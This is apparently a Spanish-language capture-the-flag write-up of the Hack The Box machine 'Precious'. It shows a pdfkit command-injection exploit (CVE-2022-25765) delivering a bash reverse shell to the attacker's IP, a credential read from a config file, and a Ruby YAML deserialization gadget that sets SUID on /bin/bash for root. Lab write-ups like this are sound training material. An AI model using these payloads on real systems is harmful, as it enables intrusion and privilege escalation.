---
title: "Precious HTB Writeup"
layout: single
excerpt: "Maquina HTB de dificultad facil, en esta maquina se ve como realizar un exploit a una aplicación web vulnerable usando una ejecución remota de comandos y un servidor local. La escalada de privilegios se basa despues en la explotación de un privilegio de sudo a un archivo .yml."
show_date: true
classes: wide
header:
  teaser: /assets/images/CTFs/Precious-HTB/icon.png
  teaser_home_page: true  
  icon: /assets/images/HackTheBox-icon.png
categories:
  - HackTheBox 
  - Easy
tags:
  - Web
  - YAML
---
![Precious](/assets/images/CTFs/Precious-HTB/header.png)

# Reconocimiento 🔎 

Como siempre realizamos un pequeño escaneo de puertos rápido con el siguiente comando buscando cualquier puerto abierto.

```bash
nmap -p- 10.10.11.189
```
![image](/assets/images/CTFs/Precious-HTB/01.png)

Continuamos con un escaneo más avanzado de estos puertos.
```bash
sudo nmap -sV -p 22,80 10.10.11.189
```
![image](/assets/images/CTFs/Precious-HTB/02.png)

Ahora vamos a configurar nuestro fichero `/etc/hosts` para poder ver el servicio http.

![image](/assets/images/CTFs/Precious-HTB/03.png)

Nos dirigimos hacia la web y vamos a poder ver que la web es un convertidor web a pdf.

![image](/assets/images/CTFs/Precious-HTB/04.png)

Así que para probarlo vamos a lanzar un servidor web en nuestra máquina local a través de python.
```bash
python3 -m http.server 80
```
![image](/assets/images/CTFs/Precious-HTB/06.png)

Así que ahora vamos a probar introduciendo la IP de la máquina atacante en el servicio web de la máquina víctima.

![image](/assets/images/CTFs/Precious-HTB/07.png)

Y como podemos ver se ha convertido nuestra web en un PDF como se esperaba, así que vamos a descargar el PDF para analizarlo con la herramienta `exiftool`.

![image](/assets/images/CTFs/Precious-HTB/08.png)

Vemos que ha sido generado por una herramienta: `pdfkit v0.8.6`. La cuál si hacemos una búqueda en Google, podemos ver que es vulnerable a `Command Injection`.

![image](/assets/images/CTFs/Precious-HTB/09.png)

Tras informarme más sobre este CVE, podemos saber que tenemos que introducir el parametro `name` y dentro usar los ``backticks`` para inyectar nuestro comando.<br>
- Para saber más sobre CVE-2022-25765:<br>
[https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 ](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) 

<br><br>

# Explotación 🔑
Vamos a probar si funciona el exploit mencionado anteriormente:
```bash
http://10.10.14.46/?name=%20`pwd`
```
![image](/assets/images/CTFs/Precious-HTB/10.png)<br>
Y vemos que funciona correctamente.

![image](/assets/images/CTFs/Precious-HTB/11.png)<br>

Así manos a la obra. Este será el payload que voy a introducir:
```bash
http://10.10.14.46/?name=%20`/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.46/4747 0>&1'`
```

Antes de lanzar el payload vamos abrir un listener con netcat:
```bash
nc -nvlp 4747
```
<br>
Ejecutamos el payload y ya tendriamos acceso a la máquina víctima.

![image](/assets/images/CTFs/Precious-HTB/12.png)<br>

Tenemos acceso al usuario ruby pero no existe ningún fichero para ejecutar como root, así que vamos a pivotar al usuario henry mediante el fichero `config` en el directorio `.bundle` que he encontrado.
```bash
ruby@precious:/var/www/pdfapp$ cd ~
cd ~
ruby@precious:~$ ls -la
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 May  3 06:34 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 May  3 06:34 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ ls -al .bundle 
ls -al .bundle
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .
drwxr-xr-x 4 ruby ruby 4096 May  3 06:34 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
ruby@precious:~$ cat .bundle/config
cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
Accedemos al usuario henry mediante ssh:
```bash
ssh henry@10.10.11.189 
```
![image](/assets/images/CTFs/Precious-HTB/13.png)<br>
Ahora pasamos a la siguiente fase para terminar con el CTF.

<br><br>

# Escalada de Privilegios 🚀
Ya teniendo acceso al usuario henry el siguiente paso sería escalar los privilegios a root.<br><br>
Vamos a listar fichero que se ejecuta como root dentro del usuario henry:

![image](/assets/images/CTFs/Precious-HTB/14.png)<br>

Obtenemos el fichero `update_dependencies.rb` que podemos ejecutarlo como usuario root. Vamos a echarle un vistazo.

![image](/assets/images/CTFs/Precious-HTB/15.png)<br>

Mirando el código veo que utiliza un YAML.load, cuál es vulnerable a ataques de deserialización YAML.<br>
<br>
Puedes ver más sobre ataques de deserialización YAML en el siguiente enlace:<br>
[https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md](https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md)
<br><br>

Ahora podemos explotar con nuestro fichero `dependencies.yml`.

![image](/assets/images/CTFs/Precious-HTB/16.png)<br>
### dependencies.yml
```YAML
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolve
```
<br>

Ejecutar el fichero con permisos de ejecución root.

![image](/assets/images/CTFs/Precious-HTB/17.png)<br>
<br>
Y ya con esto tenemos el usuario root a nuestra disposición. Y poder conseguir la **FLAG**.

![image](/assets/images/CTFs/Precious-HTB/18.png)<br>
<br>

---

<br>
Espero que te haya servido de ayuda este post. Me ayudarías mucho si lo compartes en tus **RRSS**, GRACIAS!

